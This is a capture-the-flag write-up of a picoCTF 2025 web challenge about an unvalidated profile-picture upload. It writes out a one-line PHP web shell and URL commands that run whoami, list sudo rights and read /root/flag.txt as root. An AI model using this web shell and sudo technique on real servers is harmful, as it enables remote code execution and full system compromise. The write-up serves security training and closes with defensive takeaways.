# n0s4n1ty 1 â€” picoCTF2025

**Author:** Prince Niyonshuti N.
**Tags:** Easy Â· Web Exploitation Â· browser\_webshell\_solvable

---

## ğŸ§  Description

> A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you.
>
> Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.
>
> Additional details will be available after launching your challenge instance.

---

## ğŸ” Challenge Overview

We're given a web application that allows users to upload profile pictures. Testing the functionality revealed that the server does not properly validate uploaded file types, making it vulnerable to arbitrary file uploads.

---

## ğŸ§ª Exploitation â€“ Gaining Remote Command Execution

### âœ… Step 1: Create Web Shell Payload

We created a minimal PHP web shell:

```php
<!--?php system($_GET['cmd']); ?-->
```

Saved it as:

```
shell.php
```

### âœ… Step 2: Upload the Payload

Using the file upload form on the website, we successfully uploaded the payload. After testing common upload paths, the shell was accessible at:

```
http://<ip>/uploads/shell.php
```

### âœ… Step 3: Execute Commands Remotely

We confirmed command execution by running:

```
http://<ip>/uploads/shell.php?cmd=whoami
```

Output:

```
www-data
```

---

## ğŸ› ï¸ Privilege Escalation â€“ Getting the Flag

### ğŸ” Step 4: Check Sudo Privileges

We executed:

```
http://<ip>/uploads/shell.php?cmd=sudo -l
```

The output showed:

```
(ALL) NOPASSWD: ALL
```

This means we can run any command as root **without a password**.

### ğŸ Step 5: Capture the Flag

We directly read the flag from `/root` using:

```
http://<ip>/uploads/shell.php?cmd=sudo cat /root/flag.txt
```

---

## ğŸ Flag

```
picoCTF{<REDACTED>}
```

---

## ğŸ’¡ Takeaways

* Always validate file uploads â€” never trust file extensions or MIME types alone.
* Upload functionality can be a gateway to **remote code execution** if improperly handled.
* Always check for **sudo permissions** once you gain a foothold â€” `NOPASSWD: ALL` is an easy root.

---